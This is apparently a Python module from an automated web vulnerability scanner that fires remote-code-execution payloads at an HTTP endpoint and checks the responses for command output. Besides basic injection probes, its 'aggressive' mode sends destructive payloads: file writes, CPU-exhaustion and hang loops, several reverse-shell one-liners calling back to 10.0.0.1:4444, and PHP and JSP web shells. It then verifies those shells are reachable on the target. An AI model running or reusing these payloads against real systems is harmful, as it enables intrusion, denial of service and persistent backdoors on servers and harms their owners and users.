from typing import Any, Dict, List
import time
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    # Baseline
    baseline = client.send(scenario.method, scenario.target, json_body={"ip": "127.0.0.1"})

    if baseline.status_code in [404, 405]:
        return {
            "scenario_id": scenario.id,
            "attack_type": "rce",
            "passed": True, 
            "skipped": True,
            "details": f"Endpoint returned {baseline.status_code}. Skipping attack."
        }
    
    payloads = [
        # OS Command Injection (Unix)
        "; id", 
        "| whoami",
        "$(id)",
        "`id`",
        
        # OS Command Injection (Windows)
        "& whoami",
        "| type C:\\Windows\\win.ini",
        
        # Python Injection (Pickle/Eval)
        "import os; os.system('id')",
        
        # Node.js Injection
        "require('child_process').exec('id')",
        
        # Node Deserialization (node-serialize RCE)
        {"tracker": "_$$ND_FUNC$$_function (){ return 'BP_SAFE_PROBE'; }()"}
    ]
    
    # Normalizing payloads: ensure objects are handled if they are not strings
    # (The loop below needs adjustment to handle dict payloads for JSON bodies)
    
    # DESTRUCTIVE / AGGRESSIVE RCE (User Requested: "Break the serve", "Write files")
    if scenario.config.get("aggressive"):
        print("    [!!!] INJECTING DESTRUCTIVE RCE PAYLOADS (Fork Bombs, File Writes)...")
        payloads.extend([
            # Write File (Proof of Write Access)
            "; echo 'BREAKPOINT_HACKED' > hacked.txt", 
            "| echo 'BREAKPOINT_HACKED' > C:\\hacked.txt",
             
            # Resource Exhaustion (CPU/Memory Stress)
            "; yes > /dev/null &",  # Unix CPU stress
            "import os; while True: pass", # Python infinite loop (Hang)
            "while(1){}", # Node infinite loop (Hang)
            
            # REVERSE SHELL ATTEMPTS (Real Hacker Mode)
            # Tries to connect back to a dummy IP (10.0.0.1) just to trigger outbound traffic or hang
            "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "; nc -e /bin/sh 10.0.0.1 4444",
            "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",
            
            # --- PERSISTENCE: WEB SHELLS ---
            # Try to write a shell to the current directory
            "; echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
            "| echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
            "& echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
            "; echo '<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>' > shell.jsp",
            "| echo '<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>' > shell.jsp"
        ])
    fields = scenario.config.get("fields", ["ip", "host", "command"])
    issues = []
    found_payloads = []
    leaked_data = [] 
    
    for field in fields:
        for p in payloads:
            # Handle Dict payloads (Direct JSON Injection)
            if isinstance(p, dict):
                 # Merge or set body
                 body = p
                 # If we want to target a specific field with this payload, it's tricky. 
                 # Usually deserialization replaces the whole object or a specific known field.
                 # Let's assume the payload IS the body content we want to test or a specific key.
                 # For safety, let's keep it simple: if dict, use as is.
            else:
                body = {"ip": "127.0.0.1"} 
                body[field] = f"127.0.0.1 {p}" 
            
            try:
                resp = client.send(scenario.method, scenario.target, json_body=body)
            except Exception:
                continue

            suspicious = False
            reasons = []
            text = resp.text.lower()
            
            # Differential: Strings must NOT be in baseline
            # Linux Check
            if "uid=" in text and "gid=" in text:
                if "uid=" not in baseline.text.lower():
                    suspicious = True
                    reasons.append("Command Output: 'uid/gid'")
                    leaked_data.append(f"[+] SYSTEM COMPROMISED: 'HACKED' - Command Execution Confirmed\nSHELL OUTPUT: {resp.text.strip()[:100]}")
                
            # Windows Check (whoami or win.ini)
            if "nt authority" in text or "[extensions]" in text or "fonts" in text:
                if "nt authority" not in baseline.text.lower():
                    suspicious = True
                    reasons.append("Command Output: Windows (whoami/win.ini)")
                    leaked_data.append(f"SHELL OUTPUT: {resp.text.strip()[:100]}")
                    
            # Node Deserialization Check
            if "BP_SAFE_PROBE" in resp.text:
                suspicious = True
                reasons.append("Node.js Deserialization RCE Executed")
                leaked_data.append("Node RCE Confirmed: Code executed.")

            # PERSISTENCE CHECK: Did we write 'shell.php'?
            if scenario.config.get("aggressive") and not suspicious:
                try:
                    # Construct potential shell URL. Assuming current dir based on target URL.
                    # This is naive but works for simple cases.
                    base = scenario.target.rsplit('/', 1)[0]
                    if base == "": base = "/" # root
                    
                    # Check PHP
                    shell_url = f"{base}/shell.php?cmd=echo%20BP_RCE_CONFIRMED"
                    check_shell = client.send("GET", shell_url)
                    if "BP_RCE_CONFIRMED" in check_shell.text:
                         suspicious = True
                         reasons.append(f"Web Shell Persisted at {shell_url}")
                         leaked_data.append(f"[+] WEB SHELL ACTIVE: {shell_url}")
                    
                    # Check JSP
                    shell_url_jsp = f"{base}/shell.jsp?cmd=echo%20BP_RCE_CONFIRMED"
                    check_shell_jsp = client.send("GET", shell_url_jsp)
                    if "BP_RCE_CONFIRMED" in check_shell_jsp.text:
                         suspicious = True
                         reasons.append(f"Web Shell Persisted at {shell_url_jsp}")
                         leaked_data.append(f"[+] WEB SHELL ACTIVE: {shell_url_jsp}")

                except: pass
            
            # 3. Crash / Exhaustion Detection (Heuristic)
            # Only count as DoS if it TIMED OUT (elapsed > 4.5s) significantly compared to baseline.
            if resp.elapsed_ms > 4500 and resp.status_code != 0:
                if baseline.elapsed_ms < 1000:
                    # VERIFY: Is it still hanging?
                    try:
                        resp_v = client.send(scenario.method, scenario.target, json_body=body, timeout=5.0, is_canary=True)
                        if resp_v.elapsed_ms > 4500:
                             suspicious = True
                             reasons.append(f"Persistent Server Hang (DoS via RCE). Time: {resp.elapsed_ms:.0f}ms")
                    except:
                        pass
                
            if suspicious:
                issues.append(f"[CRITICAL] RCE Probability in '{field}': {', '.join(reasons)}")
                found_payloads.append(p)

    # Calculate Confidence
    confidence = "LOW"
    if issues:
        # Check for Definitive Indicators
        strong_indicators = ["Command Output:", "RCE Executed"]
        if any(any(ind in i for ind in strong_indicators) for i in issues):
             confidence = "CONFIRMED"
        elif any("Crash/Hang" in i for i in issues):
             confidence = "HIGH" # DoS is strong signal but not code exec proof
        else:
             confidence = "MEDIUM" # Heuristic/Node generic

    return {
        "scenario_id": scenario.id,
        "attack_type": "rce",
        "passed": len(issues) == 0,
        "confidence": confidence if issues else "LOW",
        "details": {
            "issues": issues,
            "reproduction_payload": found_payloads[0] if found_payloads else None,
            "leaked_data": list(set(leaked_data))
        }
    }
